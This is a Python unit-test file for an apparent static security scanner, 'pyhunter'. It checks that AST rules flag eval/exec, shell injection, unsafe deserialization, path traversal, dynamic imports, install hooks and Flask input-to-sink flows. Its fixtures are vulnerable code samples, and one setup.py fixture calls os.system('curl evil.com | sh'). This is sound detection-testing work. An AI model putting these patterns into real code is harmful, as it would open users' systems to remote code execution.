"""Unit tests for all AST-based rules (no LLM calls)."""

import ast
import pytest

from pyhunter.rules.rce_eval import DynamicCodeExecutionRule
from pyhunter.rules.cmd_injection import CommandInjectionRule
from pyhunter.rules.unsafe_deserialization import UnsafeDeserializationRule
from pyhunter.rules.dunder_abuse import DunderAbuseRule
from pyhunter.rules.import_time_exec import ImportTimeExecRule
from pyhunter.rules.build_rce import BuildInstallRCERule
from pyhunter.rules.path_traversal import PathTraversalRule
from pyhunter.rules.dynamic_import import DynamicImportRule
from pyhunter.rules.web_flow import WebInputFlowRule
from pyhunter.rules.decorator_exec import DecoratorExecutionRule


def _parse(src: str):
    return ast.parse(src), src.splitlines()


# ── RCE eval ──────────────────────────────────────────────────────────────────

class TestDynamicCodeExecutionRule:
    rule = DynamicCodeExecutionRule()

    def test_detects_eval(self):
        tree, lines = _parse("eval(user_input)")
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1
        assert findings[0].sink == "eval"

    def test_detects_exec(self):
        tree, lines = _parse("exec(code)")
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1
        assert findings[0].sink == "exec"

    def test_safe_code_no_finding(self):
        tree, lines = _parse("x = int(user_input)")
        findings = self.rule.check(tree, lines, "test.py")
        assert findings == []


# ── Command injection ─────────────────────────────────────────────────────────

class TestCommandInjectionRule:
    rule = CommandInjectionRule()

    def test_detects_os_system(self):
        tree, lines = _parse("import os\nos.system('ls ' + path)")
        findings = self.rule.check(tree, lines, "test.py")
        assert any(f.sink == "os.system" for f in findings)

    def test_detects_subprocess_shell_true(self):
        src = "import subprocess\nsubprocess.run(cmd, shell=True)"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1

    def test_subprocess_shell_false_safe(self):
        src = "import subprocess\nsubprocess.run(['ls', path], shell=False)"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert findings == []


# ── Unsafe deserialization ────────────────────────────────────────────────────

class TestUnsafeDeserializationRule:
    rule = UnsafeDeserializationRule()

    def test_detects_pickle_loads(self):
        tree, lines = _parse("import pickle\npickle.loads(data)")
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1
        assert findings[0].sink == "pickle.loads"

    def test_detects_yaml_load_unsafe(self):
        src = "import yaml\nyaml.load(data, Loader=yaml.Loader)"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) == 1

    def test_yaml_safe_load_no_finding(self):
        src = "import yaml\nyaml.safe_load(data)"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "test.py")
        assert findings == []


# ── Dunder abuse ──────────────────────────────────────────────────────────────

class TestDunderAbuseRule:
    rule = DunderAbuseRule()

    def test_detects_class_access(self):
        tree, lines = _parse("x = obj.__class__")
        findings = self.rule.check(tree, lines, "test.py")
        assert any(f.sink == "__class__" for f in findings)

    def test_detects_subclasses(self):
        tree, lines = _parse("subs = obj.__class__.__subclasses__()")
        findings = self.rule.check(tree, lines, "test.py")
        assert len(findings) >= 1


# ── Import-time execution ─────────────────────────────────────────────────────

class TestImportTimeExecRule:
    rule = ImportTimeExecRule()

    def test_detects_eval_in_init(self):
        tree, lines = _parse("eval(dangerous)")
        findings = self.rule.check(tree, lines, "__init__.py")
        assert len(findings) == 1
        assert findings[0].sink == "eval"

    def test_ignores_regular_files(self):
        tree, lines = _parse("eval(dangerous)")
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_detects_system_in_setup(self):
        tree, lines = _parse("import os\nos.system('curl evil.com | sh')")
        findings = self.rule.check(tree, lines, "setup.py")
        assert any(f.sink == "system" for f in findings)


# ── Build/install-time RCE ────────────────────────────────────────────────────

class TestBuildInstallRCERule:
    rule = BuildInstallRCERule()

    def test_detects_cmdclass(self):
        src = "from setuptools import setup\nsetup(name='x', cmdclass={'install': MyInstall})"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "setup.py")
        assert len(findings) == 1
        assert "cmdclass" in findings[0].sink

    def test_ignores_non_setup_files(self):
        src = "setup(name='x', cmdclass={'install': MyInstall})"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "mymodule.py")
        assert findings == []

    def test_safe_setup_no_finding(self):
        src = "from setuptools import setup\nsetup(name='x', version='1.0')"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "setup.py")
        assert findings == []


# ── Path traversal ────────────────────────────────────────────────────────────

class TestPathTraversalRule:
    rule = PathTraversalRule()

    def test_detects_dynamic_open(self):
        tree, lines = _parse("open(user_path, 'r')")
        findings = self.rule.check(tree, lines, "app.py")
        assert any(f.sink == "open" for f in findings)

    def test_safe_literal_open(self):
        tree, lines = _parse("open('/etc/config.txt', 'r')")
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_detects_zip_extractall(self):
        src = "import zipfile\nwith zipfile.ZipFile(f) as z:\n    z.extractall(dest)"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("extractall" in f.sink for f in findings)


# ── Dynamic import ────────────────────────────────────────────────────────────

class TestDynamicImportRule:
    rule = DynamicImportRule()

    def test_detects_dunder_import_dynamic(self):
        tree, lines = _parse("__import__(user_module)")
        findings = self.rule.check(tree, lines, "app.py")
        assert any(f.sink == "__import__" for f in findings)

    def test_safe_dunder_import_literal(self):
        tree, lines = _parse("__import__('os')")
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_detects_importlib_dynamic(self):
        src = "import importlib\nimportlib.import_module(user_input)"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any(f.sink == "importlib.import_module" for f in findings)

    def test_safe_importlib_literal(self):
        src = "import importlib\nimportlib.import_module('json')"
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []


# ── Web input → sink flows ────────────────────────────────────────────────────

class TestWebInputFlowRule:
    rule = WebInputFlowRule()

    def test_detects_request_args_to_eval(self):
        src = """\
from flask import request
def view():
    expr = request.args.get("q")
    return eval(expr)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any(f.sink == "eval" for f in findings)
        assert any(f.source == "expr" for f in findings)

    def test_detects_request_form_to_subprocess(self):
        src = """\
import subprocess
from flask import request
def upload():
    cmd = request.form["command"]
    subprocess.run(cmd, shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("subprocess" in f.sink for f in findings)

    def test_no_finding_when_no_tainted_source(self):
        src = """\
def safe():
    cmd = "ls /tmp"
    import subprocess
    subprocess.run(cmd, shell=True)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_taint_propagates_through_assignment(self):
        src = """\
from flask import request
def view():
    raw = request.args
    user_val = raw
    return eval(user_val)
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any(f.sink == "eval" for f in findings)


# ── Decorator-based execution ─────────────────────────────────────────────────

class TestDecoratorExecutionRule:
    rule = DecoratorExecutionRule()

    def test_detects_eval_decorator(self):
        src = """\
@eval(user_expr)
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("eval" in f.sink for f in findings)

    def test_detects_run_decorator_with_dynamic_arg(self):
        src = """\
@run(user_input)
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("run" in f.sink for f in findings)

    def test_safe_route_literal_no_finding(self):
        src = """\
@app.route("/api/data")
def data():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert findings == []

    def test_detects_dynamic_route(self):
        src = """\
@app.route(user_path)
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert len(findings) == 1
        assert "route" in findings[0].sink

    def test_bare_eval_decorator(self):
        src = """\
@eval
def handler():
    pass
"""
        tree, lines = _parse(src)
        findings = self.rule.check(tree, lines, "app.py")
        assert any("eval" in f.sink for f in findings)
